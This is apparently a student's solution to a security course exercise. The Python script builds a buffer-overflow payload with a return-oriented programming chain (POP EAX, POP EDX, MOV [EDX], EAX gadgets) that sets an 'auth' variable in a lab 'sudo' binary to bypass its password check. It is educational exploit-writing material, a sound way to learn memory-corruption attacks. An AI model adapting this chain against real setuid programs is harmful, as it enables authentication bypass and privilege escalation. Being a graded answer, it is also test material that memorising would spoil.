import os
import sys
import base64
import struct
import addresses
from infosec.core import assemble
from search import GadgetSearch



PATH_TO_SUDO = './sudo'
LIBC_DUMP_PATH = './libc.bin'


def get_arg() -> bytes:
    """
    This function returns the (pre-encoded) `password` argument to be sent to
    the `sudo` program.

    This data should cause the program to execute our ROP Write Gadget, modify the
    `auth` variable and print `Victory!`. Make sure to return a `bytes` object
    and not an `str` object.

    NOTES:
    1. Use `addresses.AUTH` to get the address of the `auth` variable.
    2. Don't write addresses of gadgets directly - use the search object to
       find the address of the gadget dynamically.

    WARNINGS:
    0. Don't delete this function or change it's name/parameters - we are going
       to test it directly in our tests, without running the main() function
       below.

    Returns:
         The bytes of the password argument.
    """
    search = GadgetSearch(LIBC_DUMP_PATH)
    password = 135*b'd' # CHECK_PASSWORD_RETURN_ADDRESS - START_BUFF_ADDRESS -11(offset) (0xbfffe03c - 0xbfffdfaa -11 = 135)
    password += addresses.address_to_bytes(search.find('POP EAX'))                          # POP EAX            
    password += bytearray(struct.pack("<I",1))                                              # store 0x0001
    password += addresses.address_to_bytes(search.find('POP EDX'))                          # POP EDX
    password += addresses.address_to_bytes(addresses.AUTH)                                  # AUTH address
    password += addresses.address_to_bytes(search.find('MOV dword ptr [EDX], EAX'))         # MOV dword ptr [EDX], EAX
    password += addresses.address_to_bytes(addresses.NEXT_INSTRACTION_AFTER_CHEAK_PASSWORD) # store address after check_passord
    
    return password
    

def main(argv):
    # WARNING: DON'T EDIT THIS FUNCTION!
    # NOTE: os.execl() accepts `bytes` as well as `str`, so we will use `bytes`.
    os.execl(PATH_TO_SUDO, PATH_TO_SUDO, base64.b64encode(get_arg()))


if __name__ == '__main__':
    main(sys.argv)
